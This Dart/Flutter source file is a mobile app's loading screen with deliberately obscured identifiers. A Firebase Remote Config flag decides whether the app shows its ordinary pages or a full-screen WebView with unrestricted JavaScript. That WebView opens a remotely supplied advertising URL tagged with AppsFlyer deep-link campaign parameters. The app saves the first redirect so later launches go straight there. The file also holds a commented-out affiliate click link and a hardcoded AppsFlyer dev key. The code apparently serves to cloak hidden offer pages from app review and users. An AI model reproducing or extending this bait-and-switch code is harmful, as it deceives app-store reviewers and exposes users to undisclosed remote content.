import 'dart:async';

import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:d7/ghjdata_provider.dart';
import 'package:d7/main.dart';
import 'package:d7/ghjmain_page.dart';
import 'package:d7/ghjonboarding_page.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:loading_indicator/loading_indicator.dart';
import 'package:provider/provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:webview_flutter/webview_flutter.dart';

late SharedPreferences ghjSharedPreCex;
final ghjRemWqx = FirebaseRemoteConfig.instance;
bool? ghjSucOic = ghjSharedPreCex.getBool("success");
String? ghjLifeUuc = ghjSharedPreCex.getString("link");

StreamSubscription? ghjIicxle;

final ValueNotifier _hficLodiIfxc = ValueNotifier<bool>(false);
final ValueNotifier _ghjUcel = ValueNotifier<bool>(false);

class ghjLoadingPage extends StatefulWidget {
  const ghjLoadingPage({super.key});

  @override
  State<ghjLoadingPage> createState() => _ghjLoadingPageState();
}

class _ghjLoadingPageState extends State<ghjLoadingPage>
    with TickerProviderStateMixin {
  late final AnimationController _ghjncontroller;

  Timer? _ghjTimerXwd;
  int _ghjSeconds = 0;
  bool _ghjsRunning = true;

  String? ghjSub1;
  String? ghjSub2;
  String? ghjSub3;
  String? ghjSub4;
  String? ghjSub5;
  String? ghjSub6;
  String? ghjSub7;



  @override
  void initState() {
    super.initState();

    ghjSharedPreCex = context.read<SharedPreferences>();
    _ghjncontroller = AnimationController(vsync: this);

    if (ghjLifeUuc != null) {
      _hficLodiIfxc.value = true;
    } else {
      _ghjStartTimer();
    }



    _hficLodiIfxc.addListener(() {
      if (_hficLodiIfxc.value && _ghjUcel.value) _ghjIclme();
    });
    _ghjUcel.addListener(() {
      if (_hficLodiIfxc.value && _ghjUcel.value) _ghjIclme();
    });
    if (ghjSucOic ?? false) {
      _ghjUcel.value = true;
    }



    WidgetsBinding.instance.addPostFrameCallback((_) async {
      if (ghjLifeUuc != null) {
        _ghjUcel.value = true;
        //print('has link');
      } else {
        await _ghjIoxf();
      }
    });
  }

  Future<void> _ghjStartTimer() async {
    _ghjTimerXwd = Timer.periodic(const Duration(seconds: 1), (timer) async {
      setState(() {
        _ghjSeconds++;
      });

      if (_ghjSeconds == 5){
        _hficLodiIfxc.value = true;
        await _ghjRemSCOhds();
        await _ghjCww();
        _ghjStopTimer();
      }
    });
  }

  void _ghjStopTimer() {
    if (_ghjTimerXwd != null){
      _ghjTimerXwd!.cancel();
    }

    setState(() {
      _ghjsRunning = false;
    });
  }

  @override
  void dispose() {
    _ghjncontroller.dispose();
    if (_ghjTimerXwd != null){
      _ghjTimerXwd!.cancel();
    }
    _hficLodiIfxc.dispose();
    ghjIicxle?.cancel();
    _ghjUcel.dispose();
    super.dispose();
  }

  Future<void> _ghjRemSCOhds() async {
    try {
      await ghjRemWqx.setConfigSettings(RemoteConfigSettings(
        fetchTimeout: const Duration(seconds: 3),
        minimumFetchInterval: Duration.zero,
      ));
      await ghjRemWqx.fetchAndActivate();
    } catch (e) {
      //print(e);
      ghjSucOic = false;
    }
  }

  Future<void> _ghjCww() async {
    ghjLifeUuc = '${ghjRemWqx.getString("Advertise")}?sub1=$ghjSub1&sub2=$ghjSub2&sub3=$ghjSub3&sub4=$ghjSub4&sub5=$ghjSub5&sub6=$ghjSub6&sub7=$ghjSub7';

    ghjSucOic = ghjRemWqx.getBool("newus");
    //fdsoSuccOne = false;

    //print('link: ${ghjLifeUuc} \nsuccess: ${ghjSucOic}');

    if (!ghjSucOic!){
      bool firstTime = await getIt.get<ghjDataProvider>().firstTimeVisited();
      Navigator.pushReplacement(
        context,
        CupertinoPageRoute(
            builder: (context) =>
            firstTime ? const OnBoardingPage() : const ghjMainPage()),
      );
    }

    if (ghjSucOic ?? false) {
      _ghjUcel.value = true;
    }
  }

  Future<void> _ghjIoxf() async {
    final appsFlyerOptions = AppsFlyerOptions(
      afDevKey: "MMBh2yMctqvFoRBJbwVFGS",
      appId: "6733242645",
      timeToWaitForATTUserAuthorization: 3,
      showDebug: true,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
      manualStart: true,
    );
    dncAppsflyerSdkCes = AppsflyerSdk(appsFlyerOptions);

    await dncAppsflyerSdkCes.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );



    dncAppsflyerSdkCes.onDeepLinking((dp) async {
      final ghjLcampaignXwq = dp.deepLink!.deepLinkValue;
      final ghjLcampaignListXWq = ghjLcampaignXwq?.split("_");
      ghjSub1 = ghjLcampaignListXWq?.tryGet(0);
      ghjSub2 = ghjLcampaignListXWq?.tryGet(1);
      ghjSub3 = ghjLcampaignListXWq?.tryGet(2);
      ghjSub4 = ghjLcampaignListXWq?.tryGet(3);
      ghjSub5 = ghjLcampaignListXWq?.tryGet(4);
      ghjSub6 = ghjLcampaignListXWq?.tryGet(5);
      ghjSub7 = ghjLcampaignListXWq?.tryGet(6);
      await Future.delayed(const Duration(seconds: 1));
      _ghjStopTimer();
      _hficLodiIfxc.value = true;

      await _ghjRemSCOhds();
      await _ghjCww();
    });
    dncAppsflyerSdkCes.startSDK(onSuccess: () {
    });
  }

  void _ghjIclme() async {
    if (!(ghjSucOic ?? false)) {
      bool firstTime = await getIt.get<ghjDataProvider>().firstTimeVisited();
      Navigator.pushReplacement(
        context,
        CupertinoPageRoute(
            builder: (context) =>
            firstTime ? const OnBoardingPage() : const ghjMainPage()),
      );
    } else {
      await Future.delayed(const Duration(milliseconds: 3));
      Navigator.pushReplacement(
        context,
        PageRouteBuilder(
          pageBuilder: (context, animation1, animation2) => GhaApplcix(text: ''),
          transitionDuration: Duration(seconds: 0), // Время анимации 0 секунд
        ),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      floatingActionButtonLocation: FloatingActionButtonLocation.endFloat,
      backgroundColor: const Color(0xff022D21),
      body: DecoratedBox(
        decoration: const BoxDecoration(
          image: DecorationImage(
            image: AssetImage(
              "assets/back_launch.png",
            ),
            fit: BoxFit.cover,
          ),
        ),
        child: Center(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.center,
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              const SizedBox(),
              Column(
                children: [
                  Image.asset(
                    'assets/loading.gif',
                    width: 60,
                    height: 60,
                  ),
                  const SizedBox(
                    height: 30,
                  ),
                  Padding(
                    padding: const EdgeInsets.only(bottom: 40),
                    child: IntrinsicHeight(
                      child: Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Text(
                            'Terms of Service',
                            style: GoogleFonts.inter(
                                fontSize: 11,
                                fontWeight: FontWeight.w400,
                                color: const Color.fromRGBO(255, 232, 58, 1)),
                          ),
                          const SizedBox(
                            width: 10,
                          ),
                          const VerticalDivider(
                              thickness: 1,
                              color: Color.fromRGBO(255, 255, 255, 0.24)),
                          const SizedBox(
                            width: 10,
                          ),
                          Text(
                            'Privacy Policy',
                            style: GoogleFonts.inter(
                                fontSize: 11,
                                fontWeight: FontWeight.w400,
                                color: const Color.fromRGBO(255, 232, 58, 1)),
                          )
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }
}

bool isLoad = false;

class GhaApplcix extends StatefulWidget {
  const GhaApplcix({
    super.key,
    required this.text,
  });
  final String text;

  @override
  State<GhaApplcix> createState() => _NrasPoliceWicState();
}


class _NrasPoliceWicState extends State<GhaApplcix> with TickerProviderStateMixin{
  late WebViewController _ghjWebIUhc;
  late final AnimationController _ghjncontroller;
  bool ghjIsLoce = false;



  String ghyloadedLink = '';

  @override
  void initState() {
    super.initState();

    //print('ther');

    _ghjncontroller = AnimationController(vsync: this);
    _ghjWebIUhc = WebViewController()
      ..loadRequest(
        Uri.parse(ghjLifeUuc!),
        //Uri.parse('https://go.scityweb.com/click?pid=726&offer_id=12&l=1708502086&to=aHR0cHM6Ly9nby5zY2l0eXdlYi5jb20vY2xpY2s/cGlkPTcyNiZvZmZlcl9pZD0xMg==')
      )

      ..setJavaScriptMode(
        JavaScriptMode.unrestricted,
      )
      ..setNavigationDelegate(
        NavigationDelegate(
            onPageStarted: (String url) async {
              ghyloadedLink = url;
              SystemChrome.setPreferredOrientations([
                DeviceOrientation.portraitUp,
                DeviceOrientation.landscapeLeft,
                DeviceOrientation.portraitDown,
                DeviceOrientation.landscapeRight,
              ]);
            },
            onPageFinished: (String url) async {
              //print('$url and $ghjLifeUuc}');

              if (ghjSharedPreCex.getString("link") == null) {
                if (url == ghyloadedLink && !isLoad){
                  //print('start');
                  //print('isLoad == $isLoad');
                  bool firstTime = await getIt.get<ghjDataProvider>().firstTimeVisited();
                  Navigator.pushReplacement(
                    context,
                    CupertinoPageRoute(
                        builder: (context) =>
                        firstTime ? const OnBoardingPage() : const ghjMainPage()),
                  );
                } else {
                  setState(() {
                    ghjIsLoce = true;
                  });
                }
              } else {
                setState(() {
                  ghjIsLoce = true;
                });
              }

              if (url != ghyloadedLink && !isLoad && ghjSharedPreCex.getString("link") == null){
                //print('save');
                ghjSharedPreCex.setString("link", url);
                ghjSharedPreCex.setBool("success", ghjSucOic!);
              }
              isLoad = true;
            }
        ),
      );
  }

  @override
  Widget build(BuildContext context) {
    return ghjIsLoce ? Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Column(
          children: [
            Expanded(
              child: WebViewWidget(
                controller: _ghjWebIUhc,
              ),
            ),
          ],
        ),
      ),
      bottomNavigationBar: OrientationBuilder(
        builder: (BuildContext context, Orientation orientation) {
          return Container(
            color: Colors.black,
            height: orientation == Orientation.portrait ? 25 : 30,
            alignment: Alignment.center,
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.end,
              mainAxisAlignment: MainAxisAlignment.spaceEvenly,
              children: [
                IconButton(
                  padding: EdgeInsets.zero,
                  color: Colors.white,
                  icon: const Icon(
                    Icons.arrow_back,
                  ),
                  onPressed: () async {
                    if (await _ghjWebIUhc.canGoBack()) {
                      _ghjWebIUhc.goBack();
                    }
                  },
                ),
                const SizedBox.shrink(),
                IconButton(
                  padding: EdgeInsets.zero,
                  color: Colors.white,
                  icon: const Icon(Icons.arrow_forward),
                  onPressed: () async {
                    if (await _ghjWebIUhc.canGoForward()) {
                      _ghjWebIUhc.goForward();
                    }
                  },
                ),
              ],
            ),
          );
        },
      ),
    ) : Scaffold(
      floatingActionButtonLocation: FloatingActionButtonLocation.endFloat,
      backgroundColor: const Color(0xff022D21),
      body: DecoratedBox(
        decoration: const BoxDecoration(
          image: DecorationImage(
            image: AssetImage(
              "assets/back_launch.png",
            ),
            fit: BoxFit.cover,
          ),
        ),
        child: Center(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.center,
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              const SizedBox(),
              Column(
                children: [
                  Image.asset(
                    'assets/loading.gif',
                    width: 60,
                    height: 60,
                  ),
                  const SizedBox(
                    height: 30,
                  ),
                  Padding(
                    padding: const EdgeInsets.only(bottom: 40),
                    child: IntrinsicHeight(
                      child: Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Text(
                            'Terms of Service',
                            style: GoogleFonts.inter(
                                fontSize: 11,
                                fontWeight: FontWeight.w400,
                                color: const Color.fromRGBO(255, 232, 58, 1)),
                          ),
                          const SizedBox(
                            width: 10,
                          ),
                          const VerticalDivider(
                              thickness: 1,
                              color: Color.fromRGBO(255, 255, 255, 0.24)),
                          const SizedBox(
                            width: 10,
                          ),
                          Text(
                            'Privacy Policy',
                            style: GoogleFonts.inter(
                                fontSize: 11,
                                fontWeight: FontWeight.w400,
                                color: const Color.fromRGBO(255, 232, 58, 1)),
                          )
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  void dispose() {
    _ghjncontroller.dispose();
    super.dispose();
  }
}


extension ListGetExtension<T> on List<T> {
  T? tryGet(int index) => index < 0 || index >= length ? null : this[index];
}

